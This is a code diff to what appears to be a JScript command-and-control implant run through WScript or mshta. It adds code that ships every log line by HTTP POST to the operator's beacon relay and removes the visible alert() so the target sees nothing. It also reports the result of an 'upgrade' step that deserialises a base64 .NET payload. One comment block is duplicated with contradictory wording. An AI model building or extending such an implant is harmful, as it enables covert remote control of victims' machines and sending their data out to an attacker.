@@ -5,12 +5,45 @@ function runAgent() {
     function ensureShell() {
         if (!shell) shell = new ActiveXObject('WScript.Shell');
     }
-    var LOGGING_ENABLED = false;
+    // log() = local echo (gated) + relay ship (ALWAYS). Every line is POSTed with
+    // X-Agent-Log: 1: the relay answers immediately (no long-poll hold) and
+    // broadcasts an agent_log event to the operator's events feed. NEVER fatal —
+    // a failed ship must not kill the beacon loop — and the in-ship guard keeps a
+    // failing relay from recursing (ship failure is echoed locally, never re-shipped).
+    // log() = local echo (always) + relay ship (always). Every line is POSTed with
+    // X-Agent-Log: 1: the relay answers immediately (no long-poll hold) and
+    // broadcasts an agent_log event to the operator's events feed. NEVER fatal —
+    // a failed ship must not kill the beacon loop — and the in-ship guard keeps a
+    // failing relay from recursing (ship failure is echoed locally, never re-shipped).
+    var inShip = false;
     function log(line) {
-        if (!LOGGING_ENABLED) return;
+        // Local echo: cscript console (dev) and the dbg() hook only — NEVER alert():
+        // an mshta host would pop a visible dialog on the target per line.
         if (CAN_ECHO) WScript.Echo(line);
-        else if (typeof alert != 'undefined') alert(line);
         if (typeof dbg != 'undefined') dbg(line);
+        postLog(line);
+    }
+    // Body = one frame holding the line (UTF-8-ish: chars are masked to a byte).
+    // Each call is one synchronous round-trip that stalls the agent loop — keep
+    // log() calls to milestones, never inside tight loops.
+    function postLog(line) {
+        if (inShip || !beaconUrl || !identityHeaders) return;
+        inShip = true;
+        try {
+            var bytes = [];
+            for (var i = 0; i < line.length; i++) bytes.push(line.charCodeAt(i) & 255);
+            var xhr = new ActiveXObject('MSXML2.ServerXMLHTTP');
+            xhr.open('POST', beaconUrl, false);
+            try { xhr.setProxy(1, '', ''); } catch (e0) {}
+            xhr.setTimeouts(10000, 10000, 15000, 15000);
+            for (var h = 0; h < identityHeaders.length; h++) {
+                try { xhr.setRequestHeader(identityHeaders[h][0], identityHeaders[h][1]); } catch (e1) {}
+            }
+            xhr.setRequestHeader('X-Agent-Log', '1');
+            xhr.send(buildBodyStream([bytes]));
+        } catch (e) {
+            if (CAN_ECHO) WScript.Echo('postLog failed: ' + (e && e.message ? e.message : e));
+        } finally { inShip = false; }
     }
     function readEnv(name) {
         ensureShell();
@@ -217,8 +250,9 @@ function runAgent() {
                     blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64)));
                 }
                 log('upgrade: deserialize done');
+                postLog('upgrade ok');
                 return u32Bytes(0);
-            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return u32Bytes(1); }
+            } catch (e) { var upErr = (e && e.message ? e.message : e); log('upgrade failed: ' + upErr); postLog('upgrade failed: ' + upErr); return u32Bytes(1); }
         }
         return u32Bytes(2);
     }
